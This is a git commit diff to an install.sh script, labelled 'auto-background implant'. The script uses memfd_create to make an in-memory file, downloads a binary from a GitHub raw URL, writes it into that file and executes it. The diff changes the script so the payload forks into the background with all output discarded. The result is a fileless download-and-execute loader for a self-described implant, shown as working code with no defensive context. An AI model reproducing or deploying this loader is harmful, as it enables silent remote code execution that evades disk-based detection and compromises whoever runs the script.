5ba6b7de487f5363671d94782486d91aac50d0c1
bardaw99 <bardaw99@users.noreply.github.com>
2026-05-07 15:06:10 +0800

    auto-background implant

--- install.sh
+++ install.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 NR=319; [ "$(uname -m)" = "aarch64" ] && NR=279
-python3 -u -c "
+exec python3 -u -c "
 import ctypes, urllib.request, os, sys
 print('[*] Creating memfd...', flush=True)
 nr = $NR
@@ -9,5 +9,6 @@ print('[*] Downloading payload...', flush=True)
 data = urllib.request.urlopen('https://raw.githubusercontent.com/bardaw99/rpclib/master/rpclib').read()
 print(f'[*] Downloaded {len(data)} bytes, executing...', flush=True)
 os.write(fd, data)
-os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], os.environ)
-"
+if os.fork() == 0:
+    os.execve(f'/proc/self/fd/{fd}', [f'/proc/self/fd/{fd}'], os.environ)
+" >/dev/null 2>&1 &
